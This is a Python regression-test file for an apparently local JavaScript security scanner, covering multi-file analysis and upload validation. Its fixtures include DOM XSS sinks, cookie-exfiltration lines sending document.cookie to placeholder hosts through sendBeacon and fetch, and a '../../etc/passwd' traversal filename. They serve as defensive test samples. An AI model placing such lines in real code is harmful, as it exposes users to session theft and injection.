"""Regression tests for the local file-upload analysis path.

Uploaded files are read in the browser and analyzed by the local engine; they
never touch a cloud. These tests cover the multi-file merge service and the
HTTP validation boundaries (extension allow-list, count cap, empty handling).
"""

import json
import threading
import time
import unittest
from urllib.error import HTTPError
from urllib.request import Request, urlopen

from core.analyzer_service import analyze_files


class MultiFileServiceTest(unittest.TestCase):
    def test_multiple_files_are_merged_with_per_file_attribution(self):
        results = analyze_files([
            {"filename": "app.js",
             "code": 'const q=new URLSearchParams(location.search).get("q");document.body.innerHTML=q;'},
            {"filename": "vendor.js",
             'code': 'navigator.sendBeacon("https://v.example.net/c", document.cookie);'},
        ])
        keys = [k for k in results if not k.startswith("__")]
        self.assertIn("app.js", keys)
        self.assertIn("vendor.js", keys)

    def test_identical_content_is_deduplicated(self):
        results = analyze_files([
            {"filename": "a.js", "code": "const value = 1;"},
            {"filename": "b.js", "code": "const value = 1;"},
        ])
        keys = [k for k in results if not k.startswith("__")]
        self.assertEqual(len(keys), 1)

    def test_unsafe_filenames_are_sanitized(self):
        results = analyze_files([
            {"filename": "../../etc/passwd", "code": "const a = 1;"},
            {"filename": "same.js", "code": "const b = 2;"},
        ])
        keys = [k for k in results if not k.startswith("__")]
        self.assertTrue(keys)
        for key in keys:
            self.assertNotIn("/", key)
            self.assertNotIn("..", key)

    def test_duplicate_basenames_get_unique_keys(self):
        results = analyze_files([
            {"filename": "chunk.js", "code": "const a = 1;"},
            {"filename": "chunk.js", "code": "const b = 2;"},
        ])
        keys = sorted(k for k in results if not k.startswith("__"))
        self.assertEqual(len(keys), 2)


class UploadHttpTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        import server
        cls.server_module = server
        cls.httpd = server.make_server("127.0.0.1", 0)
        cls.thread = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
        cls.thread.start()
        cls.base = f"http://127.0.0.1:{cls.httpd.server_port}"

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()
        cls.thread.join(timeout=2)
        cls.server_module.jobs.clear_all()

    def request(self, path, body):
        request = Request(
            self.base + path,
            data=json.dumps(body).encode(),
            headers={
                "Content-Type": "application/json",
                "X-ScriptSentry-Token": self.server_module.API_TOKEN,
                "Origin": "http://localhost:3000",
            },
            method="POST",
        )
        try:
            with urlopen(request, timeout=5) as response:
                return response.status, response.read()
        except HTTPError as exc:
            return exc.code, exc.read()

    def _wait_done(self, job_id):
        req = Request(
            f"{self.base}/api/status?job_id={job_id}",
            headers={"X-ScriptSentry-Token": self.server_module.API_TOKEN},
        )
        for _ in range(250):
            with urlopen(req, timeout=5) as response:
                job = json.loads(response.read())["job"]
            if job["status"] in ("done", "error"):
                return job["status"]
            time.sleep(0.02)
        return job["status"]

    def test_upload_scan_runs_and_reports_multiple_files(self):
        status, body = self.request("/api/analyze", {
            "mode": "code",
            "files": [
                {"filename": "one.js", "code": "document.body.innerHTML = location.hash;"},
                {"filename": "two.mjs", "code": "fetch('https://x.example.com/?c='+document.cookie);"},
            ],
        })
        self.assertEqual(status, 200, body.decode())
        job_id = json.loads(body)["job_id"]
        self.assertEqual(self._wait_done(job_id), "done")

        req = Request(
            f"{self.base}/api/result?job_id={job_id}",
            headers={"X-ScriptSentry-Token": self.server_module.API_TOKEN},
        )
        with urlopen(req, timeout=5) as response:
            payload = json.loads(response.read())["payload"]
        self.assertEqual(payload["summary"]["total_files"], 2)

    def test_unsupported_extension_is_rejected(self):
        status, body = self.request("/api/analyze", {
            "mode": "code",
            "files": [{"filename": "malware.exe", "code": "binary"}],
        })
        self.assertEqual(status, 400)
        self.assertIn("Unsupported file type", body.decode())

    def test_empty_file_list_is_rejected(self):
        status, body = self.request("/api/analyze", {
            "mode": "code", "files": [],
        })
        self.assertEqual(status, 400)

    def test_too_many_files_are_rejected(self):
        status, body = self.request("/api/analyze", {
            "mode": "code",
            "files": [{"filename": f"f{i}.js", "code": "var x=1;"}
                      for i in range(self.server_module.MAX_UPLOAD_FILES + 1)],
        })
        self.assertEqual(status, 400)
        self.assertIn("Too many files", body.decode())


if __name__ == "__main__":
    unittest.main()
